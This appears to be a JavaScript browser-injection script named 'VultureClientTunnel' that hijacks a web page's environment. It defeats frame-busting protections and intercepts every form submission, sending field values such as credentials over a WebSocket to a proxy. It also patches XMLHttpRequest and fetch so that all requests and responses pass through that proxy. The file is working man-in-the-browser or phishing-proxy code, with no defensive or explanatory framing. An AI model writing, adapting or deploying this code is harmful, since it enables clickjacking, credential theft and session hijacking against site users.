class VultureClientTunnel {
    constructor(proxyWsUrl) {
        this.proxyWsUrl = proxyWsUrl;
        this.ws = new WebSocket(proxyWsUrl);
        this.pendingRequests = new Map();
        
        this.initTunnel();
        this.overrideEnvironment();
    }

    initTunnel() {
        this.ws.onmessage = (event) => {
            try {
                const responseData = JSON.parse(event.data);
                if (responseData.type === 'response' && this.pendingRequests.has(responseData.id)) {
                    const callback = this.pendingRequests.get(responseData.id);
                    callback(responseData);
                    this.pendingRequests.delete(responseData.id);
                }
            } catch (err) {
                console.error("Tunnel processing error:", err);
            }
        };
    }

    // Send a payload through the WebSocket tunnel
    sendTunneledRequest(options) {
        return new Promise((resolve) => {
            const requestId = Math.random().toString(36).substring(2, 9);
            this.pendingRequests.set(requestId, resolve);

            if (this.ws.readyState === WebSocket.OPEN) {
                this.ws.send(JSON.stringify({
                    type: 'request',
                    id: requestId,
                    ...options
                }));
            } else {
                this.ws.addEventListener('open', () => {
                    this.ws.send(JSON.stringify({
                        type: 'request',
                        id: requestId,
                        ...options
                    }));
                }, { once: true });
            }
        });
    }

    overrideEnvironment() {
        const self = this;

        // 1. Defeat Frame-Busting Scripts
        try {
            if (window.top !== window.self) {
                Object.defineProperty(window, 'top', {
                    get: function () { return window.self; }
                });
            }
        } catch (e) {
            console.warn("Failed to lock window.top context:", e);
        }

        // 2. Intercept and Rewrite Form Submissions
        window.addEventListener('submit', function (e) {
            e.preventDefault();
            const form = e.target;
            const actionUrl = form.action || window.location.href;
            const formData = new FormData(form);
            
            let bodyObj = {};
            formData.forEach((value, key) => { bodyObj[key] = value; });

            self.sendTunneledRequest({
                url: actionUrl,
                method: form.method || 'POST',
                body: bodyObj,
                headers: { 'Content-Type': 'application/json' }
            }).then(res => {
                console.log("Form submission response received via tunnel:", res);
            });
        }, true);

        // 3. Patch XMLHttpRequests (AJAX)
        const originalOpen = XMLHttpRequest.prototype.open;
        const originalSend = XMLHttpRequest.prototype.send;

        XMLHttpRequest.prototype.open = function(method, url, ...args) {
            this._targetUrl = url;
            this._method = method;
            this._headers = {};
            originalOpen.apply(this, [method, url, ...args]);
        };

        XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
            if (this._headers) this._headers[header] = value;
        };

        XMLHttpRequest.prototype.send = function(body) {
            self.sendTunneledRequest({
                url: this._targetUrl,
                method: this._method,
                headers: this._headers,
                body: body
            }).then((response) => {
                Object.defineProperty(this, 'status', { value: response.status });
                Object.defineProperty(this, 'responseText', { value: response.isBase64 ? atob(response.body) : response.body });
                Object.defineProperty(this, 'readyState', { value: 4 });
                
                if (this.onreadystatechange) this.onreadystatechange();
                this.dispatchEvent(new Event('load'));
            });
        };

        // 4. Catch and Patch the Fetch API
        const originalFetch = window.fetch;
        window.fetch = async function(input, init = {}) {
            let url = typeof input === 'string' ? input : input.url;
            let method = init.method || 'GET';
            let headers = init.headers || {};

            const response = await self.sendTunneledRequest({
                url: url,
                method: method,
                headers: headers,
                body: init.body
            });

            const textData = response.isBase64 ? atob(response.body) : response.body;

            return new Response(textData, {
                status: response.status,
                headers: new Headers(response.headers)
            });
        };
    }
}

// Instantiate globally to intercept the runtime environment instantly
window.VultureTunnel = new VultureClientTunnel("ws://localhost:8080");
